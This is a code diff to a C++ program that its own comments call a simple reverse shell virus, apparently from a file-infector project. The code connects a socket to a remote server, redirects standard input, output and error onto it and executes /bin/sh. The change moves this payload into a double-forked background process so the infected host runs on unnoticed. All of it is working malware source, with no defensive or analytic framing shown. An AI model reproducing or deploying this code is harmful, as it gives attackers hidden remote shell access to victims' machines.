@@ -1,6 +1,6 @@
+#include "common/double_fork.hh"
 #include "common/macros.hh"
 #include "nostdlib/sys/socket.hh"
-#include "nostdlib/unistd.hh"
 
 // A simple reverse shell virus that spawns a process which gives a remote
 // server shell access. The infected host will still run as is and terminate but
@@ -20,10 +20,7 @@
 // You should then have a fully interactive shell with command history/auto
 // complete + functional vim.
 int main() {
-  auto new_pid = vf::fork();
-
-  // If we are parent or failed to fork return control to host.
-  if (new_pid == 0) {
+  auto work = []() {
     ::sockaddr_in sa{};
     sa.sin_family = AF_INET;
     // Connect to server
@@ -40,10 +37,13 @@ int main() {
 
     if (vf::dup2(s, STDIN_FILENO) < 0 || vf::dup2(s, STDOUT_FILENO) < 0 ||
         vf::dup2(s, STDERR_FILENO) < 0) {
-      return 0;
+      return;
     }
     vf::execve(STR_LITERAL("/bin/sh"), nullptr, nullptr);
-  }
+  };
+
+  // Open reverse shell in another process without blocking host.
+  vf::common::double_fork(work);
 
   return 0;
 }
